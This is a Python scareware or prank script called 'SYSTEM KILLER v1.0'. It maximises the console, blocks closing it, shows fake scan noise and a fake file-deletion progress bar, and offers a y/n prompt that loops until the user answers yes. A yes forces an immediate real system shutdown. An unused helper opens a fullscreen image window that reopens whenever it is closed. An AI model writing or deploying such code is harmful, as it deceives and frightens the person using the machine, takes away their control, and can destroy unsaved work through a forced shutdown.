import os
import sys
import time
import random
import platform
import threading
import ctypes
from ctypes import wintypes
import tkinter as tk
from tkinter import messagebox  

def enable_ansi():
    kernel32 = ctypes.windll.kernel32
    hStdout = kernel32.GetStdHandle(-11)
    mode = wintypes.DWORD(0)
    kernel32.GetConsoleMode(hStdout, ctypes.byref(mode))
    mode.value |= 0x0004
    kernel32.SetConsoleMode(hStdout, mode)

def set_fullscreen():
    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    if hwnd:
        ctypes.windll.user32.ShowWindow(hwnd, 3)

def block_console_close():
    def handler(dwCtrlType):
        return True
    kernel32 = ctypes.windll.kernel32
    kernel32.SetConsoleCtrlHandler(ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_uint)(handler), 1)

def red_text(text):
    return f"\033[91m{text}\033[0m"

def print_random_chars(duration=30):
    start = time.time()
    chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?/`~'
    while time.time() - start < duration:
        line = ''.join(random.choice(chars) for _ in range(80))
        print(red_text(line))
        time.sleep(0.01)

def get_system_info_simple():
   
    info = []
    info.append(f"Hostname: {platform.node()}")
    info.append(f"OS: {platform.system()} {platform.release()} ({platform.version()})")
    info.append(f"Architecture: {platform.machine()}")
    return info

def progress_bar(seconds=5):
    total = 40
    for i in range(total + 1):
        percent = int(i / total * 100)
        bar = '█' * i + '░' * (total - i)
        print(f"\r[{bar}] {percent}%", end='', flush=True)
        time.sleep(seconds / total)
    print()

def ask_yn():
    while True:
        answer = input(red_text("Are you sure you want to completely delete the system? (y/n): ")).strip().lower()
        if answer == 'y':
            return True
        elif answer == 'n':
            pass
        else:
            print(red_text("Please answer y or n."))


def show_image_simple(image_path):
    
    
    if not image_path.lower().endswith('.gif'):
        
        sys.exit(1)

    root = tk.Tk()
    root.title("")
    root.attributes('-fullscreen', True)
    root.attributes('-topmost', True)
    root.overrideredirect(True)

    
    try:
        photo = tk.PhotoImage(file=image_path)
        label = tk.Label(root, image=photo)
        label.pack(expand=True)
    except Exception as e:
        print(red_text(f"Error loading image: {e}"))
        sys.exit(1)

    def reopen(old_root):
        old_root.destroy()
        new_root = tk.Tk()
        new_root.attributes('-fullscreen', True)
        new_root.attributes('-topmost', True)
        new_root.overrideredirect(True)
        new_label = tk.Label(new_root, image=photo)
        new_label.pack(expand=True)
        new_root.protocol("WM_DELETE_WINDOW", lambda: reopen(new_root))
        new_root.mainloop()

    root.protocol("WM_DELETE_WINDOW", lambda: reopen(root))

    def close_after_timeout():
        time.sleep(60)
        root.quit()
    threading.Thread(target=close_after_timeout, daemon=True).start()

    root.mainloop()


def show_image_no_protection(image_path):
    
    os.startfile(image_path)

def get_system_info():
    
    info = []
    info.append(f"Hostname: {platform.node()}")
    info.append(f"OS: {platform.system()} {platform.release()} ({platform.version()})")
    info.append(f"Architecture: {platform.machine()}")
   
    info.append("(psutil not installed – system info limited)")
    return info


def main():
    enable_ansi()
    set_fullscreen()
    block_console_close()

    os.system('cls' if os.name == 'nt' else 'clear')
    print(red_text("Initializing system scan..."))
    time.sleep(1)
    print_random_chars(30)

    os.system('cls' if os.name == 'nt' else 'clear')
    print(red_text("=" * 60))
    print(red_text(" " * 20 + "SYSTEM KILLER v1.0"))
    print(red_text("=" * 60))
    print()

    sys_info = get_system_info()  
    for line in sys_info:
        print(red_text(line))
    print()

    print(red_text("Deleting system files..."))
    progress_bar(5)
    print(red_text("System deletion completed."))
    print()

    if ask_yn():
        os.system('cls' if os.name == 'nt' else 'clear')
        print(red_text("SYSTEM SHUTDOWN INITIATED"))
        time.sleep(2)
        if os.name == 'nt':
            os.system("shutdown /s /t 3")
        else:
            os.system("shutdown -h now")

if __name__ == "__main__":
    main()